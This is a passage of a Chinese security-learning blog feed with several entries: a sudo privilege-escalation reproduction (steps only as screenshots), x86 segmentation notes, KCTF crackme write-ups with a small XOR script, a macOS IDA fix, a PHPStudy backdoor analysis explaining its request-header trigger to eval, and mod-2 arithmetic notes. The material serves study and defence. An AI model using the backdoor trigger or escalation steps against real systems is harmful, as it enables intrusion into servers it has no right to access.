/Users/bufsnake/golang/ch1/helloworld      /Users/bufsnake/golang/ch1/helloworld/README.md      /Users/bufsnake/golang/ch1/helloworld/main.go   /Users/bufsnake/golang/ch1/server1      /Users/bufsnake/golang/ch1/server1/mian.go/Users/bufsnake/golang/chabie   /Users/bufsnake/golang/chabie/chabie   /Users/bufsnake/golang/chabie/main.go/Users/bufsnake/golang/deferDemo.go/Users/bufsnake/golang/deferDemo1.go/Users/bufsnake/golang/exception.go/Users/bufsnake/golang/func.go/Users/bufsnake/golang/gob_msgpack.go/Users/bufsnake/golang/main.go/Users/bufsnake/golang/mapDemo.go/Users/bufsnake/golang/mulubianli.go/Users/bufsnake/golang/rand   /Users/bufsnake/golang/rand/main.go/Users/bufsnake/golang/strconv   /Users/bufsnake/golang/strconv/main.go/Users/bufsnake/golang/time   /Users/bufsnake/golang/time/main.go/Users/bufsnake/golang/web   /Users/bufsnake/golang/web/ch1      /Users/bufsnake/golang/web/ch1/login.gtpl      /Users/bufsnake/golang/web/ch1/main      /Users/bufsnake/golang/web/ch1/main.go   /Users/bufsnake/golang/web/ginDemo.go</code></pre><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>Go Go Golang</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;半个月感觉没收获多少，主要学习了加密解密、编译原理、Windows内核相关基础教程、Golang的学习，并没有学完
      
    
    </summary>
    
      <category term="Go" scheme="https://bufsnake.github.io/categories/Go/"/>
    
    
      <category term="golang" scheme="https://bufsnake.github.io/tags/golang/"/>
    
      <category term="go" scheme="https://bufsnake.github.io/tags/go/"/>
    
  </entry>
  
  <entry>
    <title>Sudo提权漏洞复现</title>
    <link href="https://bufsnake.github.io/Sudo%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.html"/>
    <id>https://bufsnake.github.io/Sudo提权漏洞复现.html</id>
    <published>2019-10-16T13:49:17.000Z</published>
    <updated>2019-11-25T09:42:53.164Z</updated>
    
    <content type="html"><![CDATA[<h3 id="开篇"><a href="#开篇" class="headerlink" title="开篇"></a>开篇</h3><blockquote><p>该漏洞虽然鸡肋，但保不准哪天碰到了，还是复现一下吧</p></blockquote><h3 id="Sudoer"><a href="#Sudoer" class="headerlink" title="Sudoer"></a>Sudoer</h3><blockquote><p>修改sudoer文件,如下</p></blockquote><p><img src="/images/pasted-176.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>我的低权限用户账号是admin</p></blockquote><h3 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h3><blockquote><p>在admin账号权限下运行</p></blockquote><p><img src="/images/pasted-177.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>在vim界面输入</p></blockquote><p><img src="/images/pasted-178.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>得到root权限</p></blockquote><p><img src="/images/pasted-179.png" srcset="/img/loading.gif" alt="upload successful"></p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><blockquote><p>sudo 1.8.28 之前的所有版本</p></blockquote><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><blockquote><p>升级sudo</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;开篇&quot;&gt;&lt;a href=&quot;#开篇&quot; class=&quot;headerlink&quot; title=&quot;开篇&quot;&gt;&lt;/a&gt;开篇&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;该漏洞虽然鸡肋，但保不准哪天碰到了，还是复现一下吧&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;Sudoe
      
    
    </summary>
    
      <category term="学习研究" scheme="https://bufsnake.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="漏洞复现" scheme="https://bufsnake.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>段的机制浅析</title>
    <link href="https://bufsnake.github.io/%E6%AE%B5%E7%9A%84%E6%9C%BA%E5%88%B6%E6%B5%85%E6%9E%90.html"/>
    <id>https://bufsnake.github.io/段的机制浅析.html</id>
    <published>2019-10-13T09:07:49.000Z</published>
    <updated>2019-11-25T09:42:53.176Z</updated>
    
    <content type="html"><![CDATA[<h2 id="开篇"><a href="#开篇" class="headerlink" title="开篇"></a>开篇</h2><blockquote><p>X86 CPU的3个模式：实模式(直接操作物理地址)、保护模式(操作虚拟内存)和虚拟8086模式(保护模式下的16位模拟)</p></blockquote><blockquote><p>X64：x86是intel推出的复杂指令集，后来amd拓展了X86指令集，称为称为x86-64，后更名为AMD 64，intel也出了自己的一套64位指令集，但是不向下兼容，所以就没了，继而移植了amd 64位指令集，称为intel 64(能够兼容x86指令集的)</p></blockquote><h2 id="段的机制"><a href="#段的机制" class="headerlink" title="段的机制"></a>段的机制</h2><h3 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h3><pre><code class="c">mov dword ptr ds:[0x123456],eax实际操作的是 ds.base + 0x123456 地址</code></pre><h4 id="段寄存器的种类"><a href="#段寄存器的种类" class="headerlink" title="段寄存器的种类"></a>段寄存器的种类</h4><blockquote><p>ES(拓展段)、CS(代码段)、SS(堆栈段)、DS(数据段)、FS、GS、LDTR、TR 共8个段寄存器</p></blockquote><h4 id="段寄存器的读写"><a href="#段寄存器的读写" class="headerlink" title="段寄存器的读写"></a>段寄存器的读写</h4><pre><code class="c">读只能读16位，写能写入96位mov ax, ds    必须指定写入的地址为16位mov ds, eax除LDTR和TR外，其余段寄存器可用MOV指令进行读写</code></pre><h4 id="段寄存器的结构"><a href="#段寄存器的结构" class="headerlink" title="段寄存器的结构"></a>段寄存器的结构</h4><p><img src="/images/pasted-170.png" srcset="/img/loading.gif" alt="upload successful"></p><pre><code class="c">struct SegMent{    WORD Selecter,   16bit//可见部分 段选择子    WROD Attribute,  16bit//属性  可读/可写/可执行    DWORD Base,      16bit//Base  段的起始地址    DWORD Limit      16bit//Limit 段的整体长度};</code></pre><p><img src="/images/pasted-171.png" srcset="/img/loading.gif" alt="upload successful"></p><h4 id="根据上图进行段寄存器的不可见部分探测"><a href="#根据上图进行段寄存器的不可见部分探测" class="headerlink" title="根据上图进行段寄存器的不可见部分探测"></a>根据上图进行段寄存器的不可见部分探测</h4><h5 id="探测Attribute是否存在"><a href="#探测Attribute是否存在" class="headerlink" title="探测Attribute是否存在"></a>探测Attribute是否存在</h5><pre><code class="c">#include &lt;stdio.h&gt;int main(){    __asm{        mov ax, cs        mov ds, ax                        //ds == cs        mov dword ptr ds:[0x1000], eax    //对ds.base + 0x1000 地址进行操作就相当于对 cs.base + 0x1000 地址进行操作，但由于 cs 属性是不可写，所以编译出错。    }    return 0;}</code></pre><h5 id="探测Base是否存在"><a href="#探测Base是否存在" class="headerlink" title="探测Base是否存在"></a>探测Base是否存在</h5><pre><code class="c">#include &lt;stdio.h&gt;int main(){    __asm{        mov ax, fs        mov ds, ax                   //ds == fs        mov dword ptr ds:[0], eax    //对ds.base + 0x0 地址进行操作就相当于对 fs.base + 0x0 地址进行操作        //等同 mov dword ptr [0x7FFDE000], eax ,正常情况下，我们对0地址是不能读也不能写，这里可以编译通过，是因为我们对地址 0x0x7FFDE000 进行写操作。将fs换成其余的段寄存器，就会报错    }    return 0;}</code></pre><h5 id="探测Limit是否存在"><a href="#探测Limit是否存在" class="headerlink" title="探测Limit是否存在"></a>探测Limit是否存在</h5><pre><code class="c">#include &lt;stdio.h&gt;int main(){    __asm{        mov ax, fs        mov ds, ax                        //ds == fs        mov dword ptr ds:[0x1000], eax    //对ds.base + 0x1000 地址进行操作就相当于对 fs.base + 0x1000 地址进行操作，但由于 fs 支持的长度只是到0xFFF，0x1000 &gt; 0xFFF，所以编译出错。    }    return 0;}</code></pre><h3 id="段描述符与段选择子"><a href="#段描述符与段选择子" class="headerlink" title="段描述符与段选择子"></a>段描述符与段选择子</h3><h4 id="GDT-全局描述符表-与LDT-本地描述符表"><a href="#GDT-全局描述符表-与LDT-本地描述符表" class="headerlink" title="GDT(全局描述符表)与LDT(本地描述符表)"></a>GDT(全局描述符表)与LDT(本地描述符表)</h4><blockquote><p>windbg查看GDT表</p></blockquote><pre><code class="c">r gdtr  //查看GDT表的位置r gdtl  //查看GDT表的长度dd 0x80808080(地址) //查看指定地址的内容(四字节查看)dq 0x80808080(地址) //查看指定地址的内容(八字节查看)dq 0x80808080(地址) L40 //查看指定地址的内容(八字节查看)，显示40组</code></pre><h4 id="段选择子结构"><a href="#段选择子结构" class="headerlink" title="段选择子结构"></a>段选择子结构</h4><p><img src="/images/pasted-172.png" srcset="/img/loading.gif" alt="upload successful"></p><h4 id="段描述符结构"><a href="#段描述符结构" class="headerlink" title="段描述符结构"></a>段描述符结构</h4><p><img src="/images/pasted-173.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-174.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-175.png" srcset="/img/loading.gif" alt="upload successful"></p><pre><code class="c">数据 E 拓展位    根据D/B位可知段的上限，0为64kb，1为4GB。    向上拓展        ds.base + limit 的红色区域是可用的    向下拓展        出了红色部分，其余是可用的代码 C 一致位    非一致代码段    一致代码段</code></pre><h3 id="段权限检查"><a href="#段权限检查" class="headerlink" title="段权限检查"></a>段权限检查</h3><blockquote><p>CPU分为四个级别R0、R1、R2、R3(操作系统并没有使用R1、R2)，R0运行内核记驱动程序，R3运行用户层程序。</p></blockquote><p><code>CPL：当前特权级别</code></p><pre><code class="c">根据CS、SS的段选择子的RPL值可知道CPL的值假设CS为0x001B（0000 0000 0001 1011）RPL为3，所以CPL为3，所以应用程序运行在3环，是用户层程序。数据段的权限检查    检查CPL权限是否大于等于DPL，RPL权限是否大于等于DPL    假设CPL = 0    mov ax，000B    mov ds，ax       //RPL = 3，指向的段描述符的DPL为0    CPL权限与DPL相同，检测通过，RPL权限比DPL权限低，检测失败代码段、系统描述符的权限检查与数据段不完全相同，后面会学习到。</code></pre><h3 id="段寄存器的操作"><a href="#段寄存器的操作" class="headerlink" title="段寄存器的操作"></a>段寄存器的操作</h3><blockquote><p>mov ds, ax //ds的值不能乱给，需要符合段选择子</p></blockquote><blockquote><p>除了mov指令还可以使用 LES，LSS，LDS，LFS，LGS指令修改段寄存器的值</p></blockquote><blockquote><p>没有LCS是因为更改CS涉及到更改EIP。</p></blockquote><pre><code class="c">例：    les ecx, fword ptr ds:[0x1000] //将ds.base + 0x1000 地址处的内容的高两个字节放入es，剩下四个字节放入ecx。fwrod（6字节）假设ax = 0x001B（0000 0000 0001 1011）所以：RPL = 3（请求特权级别为3，由11给出）     所要查询的表是GDT表（由 0 给出）     指定获取表中下标为3的段描述符（由0000 0000 0001 1给出,假设为 0x004F9AFF`0xFFFFFFFF）     根据段描述符可得         段基地址：0x00FFFFFF        段极限：0x000FFFFF(G位为0，所以在前面填充12个0)        段的属性：0x4F9A</code></pre><h3 id="回过头，在看一下段寄存器的结构"><a href="#回过头，在看一下段寄存器的结构" class="headerlink" title="回过头，在看一下段寄存器的结构"></a>回过头，在看一下段寄存器的结构</h3><pre><code class="c">struct SegMent{    WORD Selecter,   16bit//可见部分 段选择子         指向的是段选择子结构    WROD Attribute,  16bit//属性   可读/可写/可执行   指向的是段描述符结构的 G + D/B + L + AVL + 段界限0 + P + DPL + S + TYPE    DWORD Base,      32bit//Base  段的起始地址       指向的是段描述符结构的 段基地址0 + 段基地址1 + 段基地址2    DWORD Limit      32bit//Limit 段极限             指向的是段描述符结构的 段界限0 + 段界限1 合起来是20位，根据 G 位的值，若为0，则在其前面填充12位的0，最大就为0x000FFFFF，若为1，则在其后面填充12位的1，最大就为0xFFFFFFFF};虽然只能可见部分只有16bit，但是通过它去查找GDT/LDT表，就能获得其余80bit的值</code></pre><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>学习完这些，能够知道RPL、DPL、CPL分别只什么，怎么找到，段选择子与段描述符的结构以及每一位的作用，如何找到DGT/LDT表，能够按顺序背下ES、CS、SS、DS、FS、GS、LSTR、TR的名字，给一个段选择子能够分析出段的其余80bit的值。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;开篇&quot;&gt;&lt;a href=&quot;#开篇&quot; class=&quot;headerlink&quot; title=&quot;开篇&quot;&gt;&lt;/a&gt;开篇&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;X86 CPU的3个模式：实模式(直接操作物理地址)、保护模式(操作虚拟内存)和虚拟8086模式(保护模式下的16
      
    
    </summary>
    
      <category term="保护机制" scheme="https://bufsnake.github.io/categories/%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
    
    
      <category term="段的机制" scheme="https://bufsnake.github.io/tags/%E6%AE%B5%E7%9A%84%E6%9C%BA%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>KCTF-1</title>
    <link href="https://bufsnake.github.io/KCTF-1.html"/>
    <id>https://bufsnake.github.io/KCTF-1.html</id>
    <published>2019-10-01T14:01:53.000Z</published>
    <updated>2019-11-25T09:42:53.196Z</updated>
    
    <content type="html"><![CDATA[<hr><h3 id="初世纪"><a href="#初世纪" class="headerlink" title="初世纪"></a>初世纪</h3><p><img src="/images/pasted-152.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>输入不正确就会出现这个弹窗</p></blockquote><h4 id="ida打开程序"><a href="#ida打开程序" class="headerlink" title="ida打开程序"></a>ida打开程序</h4><h5 id="定位WinMain函数"><a href="#定位WinMain函数" class="headerlink" title="定位WinMain函数"></a>定位WinMain函数</h5><p><img src="/images/pasted-153.png" srcset="/img/loading.gif" alt="upload successful"></p><h5 id="找到DialogBoxParam的回调函数"><a href="#找到DialogBoxParam的回调函数" class="headerlink" title="找到DialogBoxParam的回调函数"></a>找到DialogBoxParam的回调函数</h5><p><img src="/images/pasted-154.png" srcset="/img/loading.gif" alt="upload successful"></p><pre><code class="c">函数原型：    int DialogBoxParam（HINSTANCE hInstance，LPCTSTR IpTemplateName,HWND hWndParent， DLGPROC IPDialogFunc,LPARAM dwlnitParam）；参数：hlnstance       标识一个模块的实例，该模块的可执行文件含有对话框模板。IpTemplateName  标识对话框模板。此参数可以指向一个以NULL结尾的字符串的指针,该字符串指定对话框模扳名，或是指定对话框模板的资源标识符的一个整型值。如果此参数指定了一个资源标识符，则它的高位字一定为零，且低位字一定含有标识符。一定用MAKEINTRESOURCE宏指令创建此值。hWndParent      指定拥有对话框的窗口。IpDialogFunc    指向对话框过程的指针。dwInitParam     指定传递到对话框过程中的 WM_INITDIALOG 消息 IParam 参数的值。返回值 如果函数调用成功则返回值为在对函数EndDialog的调用中的nResult参数，该EndDialog函数用于中止对话框。如果函数调用失败，则返回值为-1。</code></pre><h5 id="F5大法定位关键代码"><a href="#F5大法定位关键代码" class="headerlink" title="F5大法定位关键代码"></a>F5大法定位关键代码</h5><p><img src="/images/pasted-155.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-156.png" srcset="/img/loading.gif" alt="upload successful"></p><pre><code class="c">函数功能：该函数获取对话框中与控制有关的文本或标题。函数原型    UINT GetDlgltemText(HWND hDlg,int nlDDlltem,LPTSTR IpString int nMazCount);参数    hDlg       指向含有控制的对话框的句柄。    nlDDlgltem 指定标题或文本将被检索的控制的标识符。    IpString   指向获取标题或文本的缓冲器的指针。    nMaxCount  指定被复制到lpString参数指向的缓冲区的字符串的最大长度。如果字符串的字符最大长度超过范围，则该字符串被截断。返回值 如果函数调用成功，则返回值表示被复制缓冲区的字符串的长度，不包括以NULL结尾的字符串。如果函数调用失败,则返回值为零。若想获得更多错误信息，请调用GetLastError函数。</code></pre><blockquote><p>得到注册码为6Ewi9H</p></blockquote><h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><p><img src="/images/pasted-157.png" srcset="/img/loading.gif" alt="upload successful"></p><hr><h3 id="Exam"><a href="#Exam" class="headerlink" title="Exam"></a>Exam</h3><p><img src="/images/pasted-158.png" srcset="/img/loading.gif" alt="upload successful"></p><h4 id="OD调试之"><a href="#OD调试之" class="headerlink" title="OD调试之"></a>OD调试之</h4><p><img src="/images/pasted-159.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>通过字符串找到关键点</p></blockquote><p><img src="/images/pasted-160.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>可以看出来一些流程，输入字符串，得到长度，然后判断是否在10～30之间，将字符串copy到另外一个地方，比较字符串的第八个位置是否为’A’。</p></blockquote><p><img src="/images/pasted-161.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>进入此函数</p></blockquote><p><img src="/images/pasted-162.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>该函数的逻辑是：将输入的第七个字符串换成’#’，字符串的每位都与0x1F进行xor运算。然后下面没有思路了</p></blockquote><h4 id="IDA查看之"><a href="#IDA查看之" class="headerlink" title="IDA查看之"></a>IDA查看之</h4><p><img src="/images/pasted-163.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>找到字符串(将字符串复制到的地址)的交叉引用，挨个扫一眼</p></blockquote><p><img src="/images/pasted-164.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>可以看到这一个函数</p></blockquote><p><img src="/images/pasted-165.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>找到该函数的交叉引用</p></blockquote><p><img src="/images/pasted-166.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>可以看到第二个参数就是’invalid argument’</p></blockquote><p><img src="/images/pasted-167.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>关键比较处，a2就是’invalid argument’ ^ 28后的结果，dword_2F3088就是我们输入字符串复制到的地址</p></blockquote><blockquote><p>在关键部分下断点，可以得到比较的字符串</p></blockquote><p><img src="/images/pasted-168.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>到此，程序整体逻辑也就明了了，输入字符串，判断第八位是否为A，将第八位换成#，整体字符在与 0x1f 异或，得到的字符 和 ‘invalid argument’与28异或后的结果相比较</p></blockquote><h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><pre><code class="bash">In [1]: flag = &quot;invalid argument&quot;In [2]: temp = &#39;&#39;In [3]: for i in range(0,len(flag)):   ...:     temp += chr(ord(flag[i]) ^ 28)In [4]: tempOut[4]: &#39;urj}pux&lt;}n{iqyrh&#39;In [5]: for i in range(0,len(temp)):   ...:     flag += chr(ord(temp[i]) ^ 0x1f)In [6]: flag = &#39;&#39;In [7]: for i in range(0,len(temp)):   ...:     flag += chr(ord(temp[i]) ^ 0x1f)In [8]: flagOut[8]: &#39;jmubojg#bqdvnfmw&#39;# 最后将#换成&#39;A&#39;即可</code></pre><h4 id="验证-1"><a href="#验证-1" class="headerlink" title="验证"></a>验证</h4><p><img src="/images/pasted-169.png" srcset="/img/loading.gif" alt="upload successful"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>KCTF的题目质量是真的好，准备把这几年的比赛题目都拿来做做，学习学习，还是有很多姿势的。。。。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h3 id=&quot;初世纪&quot;&gt;&lt;a href=&quot;#初世纪&quot; class=&quot;headerlink&quot; title=&quot;初世纪&quot;&gt;&lt;/a&gt;初世纪&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/images/pasted-152.png&quot; srcset=&quot;/img/loading.gif&quot; a
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MacOS上IDA pro的小问题修复</title>
    <link href="https://bufsnake.github.io/MacOS-IDA-pro-%E8%87%B4%E6%9C%80%E5%82%BB%E7%9A%84%E6%88%91.html"/>
    <id>https://bufsnake.github.io/MacOS-IDA-pro-致最傻的我.html</id>
    <published>2019-09-30T13:04:55.000Z</published>
    <updated>2019-11-25T09:42:53.184Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote><p>每次打开ida32位版本的，都会出现卡顿几秒的情况，之前也想办法解决了，但是没能成功，趁着国庆的喜气，搞了一下，才知道是个啥情况，这里简单记录一下。</p></blockquote><h3 id="权限问题"><a href="#权限问题" class="headerlink" title="权限问题"></a>权限问题</h3><p><img src="/images/pasted-145.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>第一次遇到文件权限后门带@的，以为是这个问题，然后就疯狂Google，才得知这是Mac OS X文件系统的附加属性</p></blockquote><blockquote><p>文件的读写权限中被加上了一个@符号，这就是 Mac OS X 文件系统的附加属性（extended attributes）</p></blockquote><blockquote><p>这个属性下，打开文件显示错误为：项目“XXX”已被OS X 使用，不能打开</p></blockquote><h4 id="xattr"><a href="#xattr" class="headerlink" title="xattr"></a>xattr</h4><pre><code class="bash">xattr -c filename # 可以清除这个附加属性</code></pre><blockquote><p>天真的以为清除附加属性后，打开就没有问题了，然而，我错了。还是没能解决</p></blockquote><h3 id="查看系统日志"><a href="#查看系统日志" class="headerlink" title="查看系统日志"></a>查看系统日志</h3><p><img src="/images/pasted-146.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-147.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>出现签名的问题，然后又是一番疯狂Google</p></blockquote><p><img src="/images/pasted-148.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>允许应用控制电脑，所以每次打开应用Mac OS X都会检测程序的签名问题。可能是因为我的IDA补丁的问题。</p></blockquote><p><img src="/images/pasted-149.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>取消勾选 允许应用控制电脑 即可解决问题。</p></blockquote><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>困扰了有两个月了，搞得我都对那个程序有些恐惧，都不想打开它，今天终于解决了。学到姿势了。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;每次打开ida32位版本的，都会出现卡顿几秒的情况，之前也想办法解决了，但是没能成功，趁着国庆的喜气，搞了一下，才
      
    
    </summary>
    
      <category term="misc" scheme="https://bufsnake.github.io/categories/misc/"/>
    
    
      <category term="MacOS IDA" scheme="https://bufsnake.github.io/tags/MacOS-IDA/"/>
    
  </entry>
  
  <entry>
    <title>PHPStudy后门研究</title>
    <link href="https://bufsnake.github.io/PHPStudy%E5%90%8E%E9%97%A8%E7%A0%94%E7%A9%B6.html"/>
    <id>https://bufsnake.github.io/PHPStudy后门研究.html</id>
    <published>2019-09-25T04:07:14.000Z</published>
    <updated>2019-11-25T09:42:53.212Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>声明：分析文章仅限用于学习和研究目的,不得将学习成果用于商业或者非法用途,否则,一切后果请用户自负.</p></blockquote><hr><h3 id="PHPStudy-后门文件"><a href="#PHPStudy-后门文件" class="headerlink" title="PHPStudy 后门文件"></a>PHPStudy 后门文件</h3><blockquote><p>php/ext目录下的php_xmlrpc.dll文件 。</p></blockquote><p><img src="/images/pasted-139.png" srcset="/img/loading.gif" alt="upload successful"></p><h3 id="检测是否存在后门"><a href="#检测是否存在后门" class="headerlink" title="检测是否存在后门"></a>检测是否存在后门</h3><blockquote><p>记事本打开文件，查看是否存在如下所示的字符串，如果有说明存在后门，可升级官方最新版。</p></blockquote><p><img src="/images/pasted-140.png" srcset="/img/loading.gif" alt="upload successful"></p><h3 id="IDA分析后门文件"><a href="#IDA分析后门文件" class="headerlink" title="IDA分析后门文件"></a>IDA分析后门文件</h3><blockquote><p>根据字符串信息，快速定位关键函数</p></blockquote><p><img src="/images/pasted-141.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-142.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-143.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>根据判断请求头的Accept-Encoding是否为gzip,deflate进行判断Accept-Charset的值base64解密是否成功，如果成功就对它进行gzcompress压缩，然后执行@eval(gzuncompress(data));</p></blockquote><h3 id="相关检测脚本"><a href="#相关检测脚本" class="headerlink" title="相关检测脚本"></a>相关检测脚本</h3><blockquote><p>github已经有大佬上传了，需要研究学习的朋友，可以自己搜索</p></blockquote><hr><blockquote><p>声明：分析文章仅限用于学习和研究目的,不得将学习成果用于商业或者非法用途,否则,一切后果请用户自负.</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;声明：分析文章仅限用于学习和研究目的,不得将学习成果用于商业或者非法用途,否则,一切后果请用户自负.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h3 id=&quot;PHPStudy-后门文件&quot;&gt;&lt;a href=&quot;#PHPStudy-后门文件&quot; cl
      
    
    </summary>
    
      <category term="学习研究" scheme="https://bufsnake.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="phpstudy后门" scheme="https://bufsnake.github.io/tags/phpstudy%E5%90%8E%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>模2运算</title>
    <link href="https://bufsnake.github.io/%E6%A8%A12%E8%BF%90%E7%AE%97.html"/>
    <id>https://bufsnake.github.io/模2运算.html</id>
    <published>2019-09-17T10:13:39.000Z</published>
    <updated>2019-11-25T09:42:53.208Z</updated>
    
    <content type="html"><![CDATA[<h2 id="模2运算"><a href="#模2运算" class="headerlink" title="模2运算"></a>模2运算</h2><blockquote><p>简介：将数字换算成二进制的形式进行运算，无进位也无借位。</p></blockquote><h2 id="模2加法"><a href="#模2加法" class="headerlink" title="模2加法"></a>模2加法</h2><pre><code class="c">1 + 1 = 01 + 0 = 10 + 1 = 10 + 0 = 0    1010101+   1000101————————————    0010000    10101011+   10100111+   11100010————————————    11101110奇数个1相加得1，偶数个1相加得0    </code></pre><h2 id="模2减法"><a href="#模2减法" class="headerlink" title="模2减法"></a>模2减法</h2><pre><code class="c">1 - 1 = 01 - 0 = 10 - 1 = 10 - 0 = 0    1010101-   1000101————————————    0010000    10101011-   10100111-   11100010————————————    11101110    </code></pre><h2 id="模2乘法"><a href="#模2乘法" class="headerlink" title="模2乘法"></a>模2乘法</h2><pre><code class="c">1 x 1 = 11 x 0 = 00 x 1 = 00 x 0 = 0    1010101x   1000101————————————    1000101</code></pre><h2 id="模2除法"><a href="#模2除法" class="headerlink" title="模2除法"></a>模2除法</h2><pre><code class="c">运算的时候每位都进行xor运算规则：被除数除以除数,被除数首位为1时,商1,为0时商0     所得余数去除首位(左移一位)     重复上一步直到被除数位数少于除数位数例子：1111000对除数1101做模2除法:         1011             商     ------------1101/ 1111000             被除数 首位为1，商为1      1101                除数     ------------      0010000             余数去除首位,作为新的被除数，首位为0，商为0       0000               被除数首位为0，则除数就为0     ------------       010000             余数去除首位,作为新的被除数，首位为1，商为1        1101              被除数首位为1,除以除数      ------------        01010             余数去除首位,作为新的被除数，首位为1，商为1         1101             被除数首位为1,除以除数       ------------         0111             余数去除首位，为111位数为3，小于除数位数4，不再进行运算，得到结果结果：商1011余111        </code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;模2运算&quot;&gt;&lt;a href=&quot;#模2运算&quot; class=&quot;headerlink&quot; title=&quot;模2运算&quot;&gt;&lt;/a&gt;模2运算&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;简介：将数字换算成二进制的形式进行运算，无进位也无借位。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h
      
    
    </summary>
    
      <category term="crypto" scheme="https://bufsnake.github.io/categories/crypto/"/>
    
    
      <category term="misc" scheme="https://bufsnake.github.io/tags/misc/"/>
    
  </entry>
  
</feed>
